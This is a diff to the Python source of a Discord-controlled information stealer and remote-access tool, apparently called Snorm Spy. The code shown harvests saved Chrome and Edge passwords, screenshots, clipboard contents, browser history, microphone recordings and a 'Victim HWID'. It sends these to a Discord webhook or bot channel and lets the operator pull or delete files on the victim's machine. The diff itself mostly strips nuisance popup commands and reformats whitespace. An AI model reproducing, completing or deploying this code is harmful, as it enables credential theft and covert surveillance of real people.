@@ -26,10 +26,6 @@ import pynput
 import pyaudio
 import wave
 import threading
-import tkinter as tk
-from tkinter import messagebox
-import webbrowser
-import time
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -50,6 +46,7 @@ FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
+RECORD_SECONDS = 300
 RECORD_SECONDS = 30
 AUDIO_FILE = "mic.wav"
 
@@ -174,19 +171,19 @@ def get_passwords_from_browser(browser="chrome"):
     os.remove(file_name)
     return result
 
-    
+
 def addinfo():
     sillyname = os.getlogin()
     hostname = socket.gethostname()
     ipad = socket.gethostbyname(hostname)
-    
+
     return sillyname, ipad
 
-    
+
 def grabscreen():
     screenshot = ImageGrab.grab()
     return screenshot
-    
+
 def grabscreenbytes(screenshot):
     ssba = io.BytesIO()
     screenshot.save(ssba, format='PNG')
@@ -196,18 +193,18 @@ def grabscreenbytes(screenshot):
 async def on_ready():
     try:
         sillyname, ipad = addinfo()
-        
+
         chrome_data = get_passwords_from_browser("chrome")
         edge_data = get_passwords_from_browser("edge")
-        
+
         screenshot = grabscreen()
         screenshot_bytes = grabscreenbytes(screenshot)
-        
+
         stolen_data = {**chrome_data, **edge_data}
 
         if stolen_data:
             print(f".....")
-            
+
             image_url = "https://media.discordapp.net/attachments/1335780021817573499/1335825951249924207/313dddddd.png?ex=67a1945d&is=67a042dd&hm=199dca0c5f43187ccbe47d49dbe2c086b61157462878b7d09833fa0ee16aaf48&=&format=webp&quality=lossless"
 
             payload = {
@@ -284,7 +281,7 @@ async def webcam(ctx):
 async def clipboard(ctx):
     try:
         clipboard_content = pyperclip.paste()  # Get copeid thing
-        
+
         if not clipboard_content:
             await ctx.send("Clipboard is empty.")
         else:
@@ -296,7 +293,7 @@ async def clipboard(ctx):
 @bot.command()
 async def ip(ctx):
     try:
-        
+
         response = requests.get("http://ip-api.com/json/").json()
 
         if response["status"] == "success":
@@ -311,7 +308,7 @@ async def ip(ctx):
         else:
             ip_info = "Failed to get IP info."
 
-        
+
         payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
         requests.post(WEBHOOK_URL, json=payload)
 
@@ -327,7 +324,7 @@ async def tts(ctx, *, message: str):
 
 def get_browser_history(browser_name):
     try:
-        
+
         browser_paths = {
     "Chrome": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\History"),
     "Edge": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Microsoft\Edge\User Data\Default\History"),
@@ -345,15 +342,15 @@ def get_browser_history(browser_name):
         if not os.path.exists(history_db):
             return f"{browser_name} history file not found."
 
-        
+
         temp_db = f"temp_{browser_name.lower()}_history.db"
         shutil.copy2(history_db, temp_db)
 
-        
+
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
 
-        
+
         cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
         history = cursor.fetchall()
 
@@ -363,7 +360,7 @@ def get_browser_history(browser_name):
         if not history:
             return f"No browsing history found for {browser_name}."
 
-        
+
         history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
         return f"**Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
 
@@ -378,7 +375,7 @@ async def browser(ctx):
     vivaldi_history = get_browser_history("Vivaldi")
     opera_history = get_browser_history("Opera")
     opera_gx_history = get_browser_history("Opera GX")
-    
+
     file_name = "SillySnormBrowserSpy.txt"
     with open(file_name, "w", encoding="utf-8") as file:
         file.write(chrome_history)
@@ -392,9 +389,9 @@ async def browser(ctx):
 @bot.command()
 async def download(ctx, file_path: str):
     try:
-        
+
         if os.path.exists(file_path):
-            
+
             await ctx.send(file=discord.File(file_path))
             await ctx.send(f"File '{file_path}' sent successfully!")
         else:
@@ -405,9 +402,9 @@ async def download(ctx, file_path: str):
 @bot.command()
 async def delete(ctx, file_path: str):
     try:
-        
+
         if os.path.exists(file_path):
-            
+
             os.remove(file_path)
             await ctx.send(f"File '{file_path}' has been deleted successfully.")
         else:
@@ -457,7 +454,7 @@ def GetSelf() -> tuple[str, bool]:
 
 @bot.command()
 async def hwid(ctx):
-    
+
     hwid = uuid.UUID(int=uuid.getnode()).hex
     await ctx.send(f"Victim HWID : {hwid}")
 
@@ -465,82 +462,55 @@ async def hwid(ctx):
 async def jumpscare(ctx):
     """Displays an image on the user's screen."""
 
-    
+
     image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
 
-    
+
     response = requests.get(image_url)
     if response.status_code == 200:
         image = Image.open(io.BytesIO(response.content))
 
-        
+
         temp_path = os.path.join(os.environ["TEMP"], "jumpscare.png")
         image.save(temp_path)
 
-        
+
         image.show()
 
         await ctx.send("Jumpscare image has been displayed!")
     else:
         await ctx.send("Failed to load the image.")
 
-@bot.command()
-async def invite(ctx):
-    invite_link = discord.utils.oauth_url(bot.user.id)
-    await ctx.send(f"Hehe: {invite_link}")
-
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
+RECORD_SECONDS = 300  
 RECORD_SECONDS = 30  
 AUDIO_FILE = "mic.wav"
 
 @bot.command()
 async def mic(ctx):
-    
+
     await ctx.send("Recording their MIC")
 
-    
+
     thread = threading.Thread(target=record_audio)
     thread.start()
 
-    
+
     thread.join()  
 
-    
+
     if os.path.exists(AUDIO_FILE):
         await ctx.send("Sending file..")
         await ctx.send(file=discord.File(AUDIO_FILE))
 
-        
+
         os.remove(AUDIO_FILE)
     else:
         await ctx.send("No audio file was created.")
-
-def show_popup(title, content, times):
-    
-    root = tk.Tk()
-    root.withdraw()  
-
-    
-    for _ in range(times):
-        messagebox.showinfo(title, content)
-        
-        root.after(500)  # 0.5 miliseconds bttw
-        root.update()  
-
-@bot.command()
-async def popup(ctx, title: str, content: str, times: int):
-    show_popup(title, content, times)
-
-@bot.command()
-async def open(ctx, url: str, times: int):
-    for _ in range(times):
-        webbrowser.open(url)
-        time.sleep(0.5)  
-    await ctx.send(f"Opened {url} {times} times. hehehe")
 
 
 bot.run(TOKEN)
